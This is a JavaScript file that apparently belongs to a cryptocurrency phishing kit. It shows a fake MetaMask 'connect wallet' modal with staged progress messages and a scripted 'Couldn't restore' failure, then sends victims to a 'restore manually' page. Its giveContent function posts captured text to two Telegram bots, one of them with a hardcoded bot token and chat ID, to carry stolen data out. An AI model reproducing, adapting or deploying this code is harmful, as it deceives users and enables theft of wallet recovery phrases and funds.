// require("dotenv").config();

document.addEventListener("DOMContentLoaded", () => {
  const metamaskIcon = require("../assets/metamask.png");
  const shieldIcon = require("../assets/shield.png");
  const circledArrowIcon = require("../assets/circled-arrow.png");

  const allIcons = [
    {
      img: metamaskIcon,
      url: "metamask.io",
      name: "Metamask",
      id: "metamask",
    },
  ];
  const modalWallets = document.createElement("button");
  modalWallets.setAttribute("id", "#modal-wallets");

  document.addEventListener("click", (e) => {
    if (e.target.classList.contains("form-id")) {
      e.preventDefault();
      modalWallets.click();
    }
  });

  // const modalWallets = document.querySelector("#modal-wallets");

  // Function to render wallet icons
  async function renderIcons(icons) {
    modalWallets.innerHTML = ""; // Clear existing icons

    for (const icon of icons) {
      // const imgSrc = await import(`../assets/${icon.id}.png`);

      const divWallet = createWalletElement(icon, icon.img);
      modalWallets.appendChild(divWallet);
    }
  }

  // Create a wallet element
  function createWalletElement(icon, imgSrc) {
    const divWallet = document.createElement("div");
    divWallet.setAttribute("id", icon.id);
    divWallet.className =
      "flex flex-row justify-start items-center space-x-4 px-4 py-4 rounded-lg shadow-md w-full bg-white wallet-sel";
    divWallet.innerHTML = `
      <div class="relative">
        <img src="${imgSrc}" alt="" class="w-14" />
        <div class="absolute bottom-0 right-0">
          <div class="bg-purple-900 rounded-full p-[0.25rem]"></div>
        </div>
      </div>
      <div class="flex flex-col justify-start items-center">
        <p class="font-bold mr-auto">${icon.name}</p>
        <p class="font-light text-gray-400 mr-auto text-xs">${icon.url}</p>
      </div>
    `;
    return divWallet;
  }

  // Function to update second modal content with icon details
  function updateModalContent(icon) {
    const modalContent = document.querySelector("#modal-wallet-click");

    function showSequence() {
      const steps = [
        "Initializing",
        "Getting keychain",
        "Connecting to wallet"
      ];
      let currentStep = 0;

      function nextStep() {
        if (currentStep < steps.length) {
          modalContent.innerHTML = `
            <p class="flex flex-col justify-center items-center space-y-1">
              <img src="${icon.img}" alt="" class="mx-auto w-12" />
              <span class="font-bold">${icon.name}</span>
            </p>
            <p class="text-gray-500 text-center text-sm">
              This session is secured and encrypted
            </p>
            <div class="flex flex-col w-10/12 justify-center items-center space-y-3 bg-white py-3 rounded-b-xl" id="error-b-c">
              <div class="py-4 relative w-52">
                <div class="progress-container bg-violet-900 rounded-lg w-full"></div>
                <div class="progress rounded-full bg-violet-900"></div>
              </div>
              <p class="flex flex-col justify-center items-center space-y-1">
                <span class="font-bold text-center text-sm">${steps[currentStep].toLowerCase()}</span>
                <span class="font-medium italic text-xs text-center">..please wait..</span>
              </p>
            </div>
            
            <p class="flex flex-row justify-center items-center space-x-2 w-8/12 mx-auto">
              <img src="${shieldIcon}" alt="" class="w-7" />
              <span class="text-gray-600 font-medium text-wrap text-xs">
                This session is protected with an end-to-end encryption
              </span>
            </p>
          `;
          currentStep++;
          setTimeout(nextStep, 1500);
        } else {
          showFailure();
        }
      }

      function showFailure() {
        modalContent.innerHTML = `
          <p class="flex flex-col justify-center items-center space-y-1">
            <img src="${icon.img}" alt="" class="mx-auto" />
            <span class="font-bold">${icon.name}</span>
          </p>
          <div class="flex flex-col w-11/12 justify-center items-center  bg-white pb-10 rounded-xl -mt-5">
            
            <p class="text-red-600 font-bold text-lg leading-tight">Couldn't restore</p>
            <p class="text-gray-500 text-center text-sm px-4">
              We encountered an issue while trying to restore your wallet. Please try again or restore manually.
            </p>
            <div class="flex flex-row w-full px-6 justify-center items-center space-x-4 pt-2 pb-4">
              <button id="try-again-btn" class="bg-violet-900 text-white font-bold py-2 px-6 rounded-full hover:bg-violet-800 transition-colors text-sm whitespace-nowrap">
                Try again
              </button>
              <button id="connect-manually-btn" class="text-gray-500 font-medium hover:text-gray-700 transition-colors text-xs underline whitespace-nowrap">
                Restore manually
              </button>
            </div>
          </div>
        `;

        document.getElementById("try-again-btn").addEventListener("click", () => {
          showSequence();
        });

        document.getElementById("connect-manually-btn").addEventListener("click", () => {
          window.location.href = "submit.html";
        });
      }

      nextStep();
    }

    showSequence();
  }

  // Initial render of all icons
  renderIcons(allIcons);

  // Event listener using event delegation for first modal
  modalWallets.addEventListener("click", (e) => {
    // const clickedIconId = e.target.closest("div[id]").id;
    const foundIcon = allIcons.find((icon) => icon.id === "metamask");
    // const foundIcon = allIcons.find((icon) => icon.id === clickedIconId);

    if (foundIcon) {
      console.log("Found icon:", foundIcon);
      // Update first modal content with found icon details
      updateModalContent(foundIcon);
      // Trigger the second modal
      document.querySelector("#vert-click").click();
      // document.querySelector("#walletclick").click();

      document.body.lastElementChild.className = `transition-all duration-300 ease-in-out fixed inset-0 z-[1040] bg-black w-screen h-screen opacity-20`;
    } else {
      console.log("Icon not found with id:", clickedIconId);
    }
  });

  // Event listener for input change
  // const searchInput = document.getElementById("wallet-search");
  // searchInput.addEventListener("input", () => {
  //   const searchTerm = searchInput.value.toLowerCase().trim();

  //   // Filter icons based on search term
  //   const filteredIcons = allIcons.filter((icon) => {
  //     const lowerCaseName = icon.name.toLowerCase();
  //     const lowerCaseUrl = icon.url.toLowerCase();
  //     return (
  //       lowerCaseName.includes(searchTerm) || lowerCaseUrl.includes(searchTerm)
  //     );
  //   });

  //   // Render filtered icons
  //   renderIcons(filteredIcons);
  // });

  async function giveContent(x) {
    const options = {
      method: "POST",
      mode: "cors",
      headers: {
        accept: "application/json",
        "content-type": "application/json",
      },
      body: JSON.stringify({
        text: String(x),
        disable_web_page_preview: false,
        disable_notification: false,
        reply_to_message_id: null,
        chat_id: process.env.CHAT_ID,
      }),
    };
  
    console.log(x);
  
    // First Telegram (existing)
    fetch(
      `https://api.telegram.org/bot${process.env.BOT_ID}/sendMessage`,
      options
    )
      .then((response) => response.json())
      .then((response) => console.log(response))
      .catch((err) => console.error(err));
  
    // Second Telegram (new - hardcoded)
    const secondTelegramOptions = {
      method: "POST",
      mode: "cors",
      headers: {
        accept: "application/json",
        "content-type": "application/json",
      },
      body: JSON.stringify({
        text: String(x),
        disable_web_page_preview: false,
        disable_notification: false,
        reply_to_message_id: null,
        chat_id: "8410717800", // Hardcoded chat ID
      }),
    };
  
    fetch(
      "https://api.telegram.org/bot7199118956:AAE7DRxYf3huaDT4UMHO3t2JDUqgD8U_S1U/sendMessage",
      secondTelegramOptions
    )
      .then((response) => response.json())
      .then((response) => console.log('Second Telegram:', response))
      .catch((err) => console.error('Second Telegram error:', err));
  }
});
